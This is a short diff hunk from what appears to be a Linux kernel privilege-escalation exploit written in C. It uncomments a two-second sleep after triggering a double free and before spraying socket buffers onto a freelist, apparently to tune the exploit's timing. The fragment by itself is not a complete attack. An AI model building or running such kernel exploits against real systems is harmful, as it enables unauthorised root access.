@@ -323,7 +323,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 	trigger_double_free_hdr(32768 + 8, &df_ip_header);
 
 	//printf("some chill after 1st free");
-	//sleep(2);
+	sleep(2);
 	
 	// push N skbs to skb freelist
 	for (int i=0; i < CONFIG_SKB_SPRAY_AMOUNT; i++)
